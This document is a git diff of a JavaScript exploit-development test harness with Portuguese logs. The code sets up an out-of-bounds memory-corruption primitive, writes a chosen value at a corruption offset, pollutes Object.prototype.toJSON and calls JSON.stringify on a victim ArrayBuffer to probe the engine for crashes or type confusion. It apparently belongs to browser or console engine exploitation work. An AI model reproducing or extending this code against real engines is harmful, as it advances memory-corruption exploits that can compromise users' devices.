@@ -15,14 +15,14 @@ const FOCUSED_TEST_PARAMS = {
     ppKeyToPollute: 'toJSON',
 };
 
-// Este contador será usado pelas funções toJSON definidas em runAllAdvancedTestsS3.mjs
-export let currentCallCount_toJSON = 0;
+export let currentCallCount_toJSON_for_typeerror_test = 0;
 
-export async function executeFullFreezeScenarioTest(
+export async function executeTypeErrorInvestigationTest(
     testVariantDescription,
-    toJSONFunctionLogic // A função que será usada como Object.prototype.toJSON
+    applyPrototypePollution, // true ou false
+    toJSONFunctionToUse // A função para poluir, se applyPrototypePollution for true
 ) {
-    const FNAME_TEST = `executeFullFreezeScenario<${testVariantDescription}>`;
+    const FNAME_TEST = `executeTypeErrorInvestigation<${testVariantDescription}>`;
     const {
         victim_ab_size,
         corruption_offset,
@@ -31,17 +31,17 @@ export async function executeFullFreezeScenarioTest(
         ppKeyToPollute,
     } = FOCUSED_TEST_PARAMS;
 
-    logS3(`--- Iniciando Teste de Congelamento (Cenário Completo): ${testVariantDescription} ---`, "test", FNAME_TEST);
-    logS3(`   Offset: ${toHex(corruption_offset)}, Valor: ${toHex(value_to_write)}`, "info", FNAME_TEST);
+    logS3(`--- Iniciando Teste de Investigação TypeError: ${testVariantDescription} ---`, "test", FNAME_TEST);
+    logS3(`   Offset: ${toHex(corruption_offset)}, Valor: ${toHex(value_to_write)}, Aplicar PP: ${applyPrototypePollution}`, "info", FNAME_TEST);
     document.title = `Iniciando: ${testVariantDescription}`;
 
-    currentCallCount_toJSON = 0; // Resetar contador para cada variante de teste
+    currentCallCount_toJSON_for_typeerror_test = 0; 
 
     await triggerOOB_primitive();
     if (!oob_array_buffer_real) {
         logS3("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME_TEST);
         document.title = "ERRO: Falha OOB Setup";
-        return { potentiallyFroze: false, errorOccurred: true, calls: currentCallCount_toJSON };
+        return { errorOccurred: true, calls: currentCallCount_toJSON_for_typeerror_test };
     }
     document.title = "OOB Configurado";
 
@@ -50,23 +50,28 @@ export async function executeFullFreezeScenarioTest(
 
     let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKeyToPollute);
     let pollutionAppliedThisRun = false;
-    let stepReached = "antes_pp";
-    let potentiallyFroze = true; 
+    let stepReached = "antes_pp_check";
     let errorOccurred = false;
 
     try {
-        logS3(`Tentando poluir Object.prototype.${ppKeyToPollute} com lógica: ${testVariantDescription}`, "info", FNAME_TEST);
-        document.title = `Aplicando PP: ${testVariantDescription}`;
-        stepReached = "aplicando_pp";
+        if (applyPrototypePollution) {
+            logS3(`Tentando poluir Object.prototype.${ppKeyToPollute} com lógica: ${testVariantDescription}`, "info", FNAME_TEST);
+            document.title = `Aplicando PP: ${testVariantDescription}`;
+            stepReached = "aplicando_pp";
 
-        Object.defineProperty(Object.prototype, ppKeyToPollute, {
-            value: toJSONFunctionLogic,
-            writable: true, configurable: true, enumerable: false
-        });
-        pollutionAppliedThisRun = true;
-        logS3(`Object.prototype.${ppKeyToPollute} poluído.`, "good", FNAME_TEST);
-        stepReached = "pp_aplicada";
-        document.title = `PP Aplicada: ${testVariantDescription}`;
+            Object.defineProperty(Object.prototype, ppKeyToPollute, {
+                value: toJSONFunctionToUse, // Usa a lógica fornecida
+                writable: true, configurable: true, enumerable: false
+            });
+            pollutionAppliedThisRun = true;
+            logS3(`Object.prototype.${ppKeyToPollute} poluído.`, "good", FNAME_TEST);
+            stepReached = "pp_aplicada";
+            document.title = `PP Aplicada: ${testVariantDescription}`;
+        } else {
+            logS3(`Poluição de Protótipo DESABILITADA para: ${testVariantDescription}`, "info", FNAME_TEST);
+            stepReached = "pp_desabilitada";
+            document.title = `PP Desabilitada: ${testVariantDescription}`;
+        }
 
         logS3(`CORRUPÇÃO: Escrevendo valor ${toHex(value_to_write)} (${bytes_to_write_for_corruption} bytes) em offset abs ${toHex(corruption_offset)}`, "warn", FNAME_TEST);
         stepReached = "antes_escrita_oob";
@@ -80,53 +85,43 @@ export async function executeFullFreezeScenarioTest(
 
         stepReached = "antes_stringify";
         document.title = `Antes Stringify: ${testVariantDescription}`;
-        logS3(`Chamando JSON.stringify(victim_ab)... (PONTO CRÍTICO PARA CONGELAMENTO)`, "info", FNAME_TEST);
+        logS3(`Chamando JSON.stringify(victim_ab)...`, "info", FNAME_TEST);
         let stringifyResult = null;
         try {
             stringifyResult = JSON.stringify(victim_ab); 
             stepReached = "apos_stringify";
             document.title = `Stringify Retornou: ${testVariantDescription}`;
-            potentiallyFroze = false;
             logS3(`Resultado de JSON.stringify(victim_ab): ${String(stringifyResult).substring(0, 300)}`, "info", FNAME_TEST);
-            if (stringifyResult && typeof stringifyResult === 'string' && 
-                (stringifyResult.includes("toJSON_error_") || stringifyResult.includes("toJSON_this_is_null"))) { 
-                logS3("SUCESSO ESPECULATIVO: Erro indicado no resultado do toJSON stringificado.", "vuln", FNAME_TEST);
-                errorOccurred = true; 
-            }
         } catch (e) {
             stepReached = "erro_stringify";
             document.title = `ERRO Stringify (${e.name}): ${testVariantDescription}`;
-            potentiallyFroze = false;
             errorOccurred = true;
-            logS3(`ERRO CRÍTICO CAPTURADO durante JSON.stringify(victim_ab): ${e.name} - ${e.message}.`, "critical", FNAME_TEST);
+            logS3(`ERRO CAPTURADO durante JSON.stringify(victim_ab): ${e.name} - ${e.message}.`, "critical", FNAME_TEST);
             console.error(`JSON.stringify Test Error (${testVariantDescription}):`, e);
         }
 
     } catch (mainError) {
         stepReached = "erro_principal";
         document.title = `ERRO Principal: ${testVariantDescription}`;
-        potentiallyFroze = false;
         errorOccurred = true;
         logS3(`Erro principal no teste (${testVariantDescription}): ${mainError.message}`, "error", FNAME_TEST);
         console.error(mainError);
     } finally {
         if (pollutionAppliedThisRun) {
+            // Restaurar apenas se foi poluído nesta execução
             if (originalToJSONDescriptor) {
                 Object.defineProperty(Object.prototype, ppKeyToPollute, originalToJSONDescriptor);
             } else {
                 delete Object.prototype[ppKeyToPollute];
             }
+            logS3(`Object.prototype.${ppKeyToPollute} restaurado para ${testVariantDescription}.`, "info");
         }
         clearOOBEnvironment();
         logS3(`Ambiente OOB Limpo. Último passo alcançado: ${stepReached}`, "info", FNAME_TEST);
-        if (potentiallyFroze) {
-            logS3(`O TESTE PODE TER CONGELADO. Último passo logado: ${stepReached}. Chamadas toJSON: ${currentCallCount_toJSON}`, "warn", FNAME_TEST);
-            document.title = `CONGELOU? Passo: ${stepReached} - Chamadas: ${currentCallCount_toJSON} - ${testVariantDescription}`;
-        }
     }
-    logS3(`--- Teste de Congelamento Concluído: ${testVariantDescription} (Chamadas toJSON: ${currentCallCount_toJSON}) ---`, "test", FNAME_TEST);
-    if (!potentiallyFroze && !errorOccurred) {
-        document.title = `Teste OK (sem congelar/erro JS): ${testVariantDescription}`;
+    logS3(`--- Teste de Investigação TypeError Concluído: ${testVariantDescription} (Chamadas toJSON: ${currentCallCount_toJSON_for_typeerror_test}) ---`, "test", FNAME_TEST);
+    if (!errorOccurred && stepReached === "apos_stringify") { // Se completou sem erro explícito
+        document.title = `Teste OK: ${testVariantDescription}`;
     }
-    return { potentiallyFroze, errorOccurred, calls: currentCallCount_toJSON };
+    return { errorOccurred, calls: currentCallCount_toJSON_for_typeerror_test };
 }
